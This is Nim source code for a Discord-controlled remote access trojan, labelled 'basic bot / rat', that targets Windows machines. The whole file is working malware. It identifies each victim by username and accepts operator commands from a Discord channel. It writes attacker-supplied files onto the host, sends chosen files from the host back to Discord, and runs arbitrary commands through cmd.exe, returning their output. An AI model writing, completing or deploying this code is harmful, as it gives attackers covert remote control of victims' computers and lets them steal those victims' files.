# basic bot / rat
# created by : cosmo

#[
    compile : nim c -r -d:dimscordDebug -d:ssl basic-bot.nim
]#

# imports
import dimscord, asyncdispatch, options, os, strutils
import winim/lean
import winim/inc/lm
import httpclient
import streams
import system
import osproc

# client side, change values
let
    discord = newDiscordClient("BOT TOKEN")
    channelIdNumber = "CHANNEL ID NUMBER"

# help menu
const helpMenu = """
**[+] Getting Started:**
 - `help` - show help menu
 - `hello` - ping target
 - `select <target-username>` - select target ['all' by default]

**[+] General:**
 - `upload <attachment>` - upload file(s) to server
 - `download <path>` - download file from target 

**[+] System:**
 - `$<command>` - execute command
"""

# get target username
var
    targetUsername = newString(UNLEN + 1)
    cb = DWORD targetUsername.len

GetUsernameA(&targetUsername, &cb)
targetUsername.setLen(cb - 1)
var selectedTarget = targetUsername # <-- will come back here

# handler for on ready
proc onReady(s: Shard, r: Ready) {.event(discord).} =
    echo "Ready as " & targetUsername 

# handler for message events
proc messageCreate(s: Shard, m: Message) {.event(discord).} =

    # grab content
    let content = m.content

    # prevent bot from responding to itself
    if (m.author.bot): return

    # check specific channel
    if (m.channel_id == channelIdNumber):

        # hello
        if (content == "hello"):
            discard await discord.api.sendMessage(m.channel_id, "[+] Hello from **" & targetUsername & "**")

        # target selection
        if (content.startsWith("select")):
            var 
                messageContents = split(content, " ")

            try:
                selectedTarget = messageContents[1]

                # select all
                if (selectedTarget == "all"):
                    selectedTarget = targetUsername

                # select target
                if (selectedTarget == targetUsername):
                    discard await discord.api.sendMessage(m.channel_id, "[+] Selected Target : **" & selectedTarget & "**")

            except:
                discard await discord.api.sendMessage(m.channel_id, "[!!] No Target Selected")

        # if bot is running on specified target
        if (selectedTarget == targetUsername):
            
            # help menu
            if (content == "help"):
                discard await discord.api.sendMessage(m.channel_id, helpMenu)

            # upload files
            elif (content == "upload"):
                discard await discord.api.sendMessage(m.channel_id, "[*] Uploading...")

                # iterate through attachments
                for attachmentIndex, attachmentValue in m.attachments:
                    var
                        # get attachment data
                        filename = attachmentValue.filename
                        url = attachmentValue.url

                        # http download
                        client = newHttpClient()
                        response = client.get(url)
                        f = newFileStream(filename, fmWrite)

                    # write to file
                    f.write(response.body)
                    f.flush

                    # verbosity
                    discard await discord.api.sendMessage(m.channel_id, "[+] Uploaded **" & filename & "** to : **" & targetUsername & "**")
            
            # download files
            elif (content.startsWith("download")):
                discard await discord.api.sendMessage(m.channel_id, "[*] Downloading...")

                # attemtp to download file
                try:
                    var path = split(content, " ")[1]
                    discard await discord.api.sendMessage(m.channel_id, "[+] Downloaded From : **" & targetUsername & "**", files = @[DiscordFile(name: path)])

                # exception
                except:
                    discard await discord.api.sendMessage(m.channel_id, "[!!] File Not Found")

            # code execution
            elif (content.startswith("$")):
                
                var 
                    # get command
                    command = content[1 .. content.high]
                    # run command on system
                    commandOutput = execProcess("cmd.exe /c" & command) 

                # return the command output
                try:
                    discard await discord.api.sendMessage(m.channel_id, commandOutput)

                # exception
                except:
                    discard await discord.api.sendMessage(m.channel_id, "[+] Ran : `" & command & "` on : **" & targetUsername & "**")

# start bot
waitFor discord.startSession()
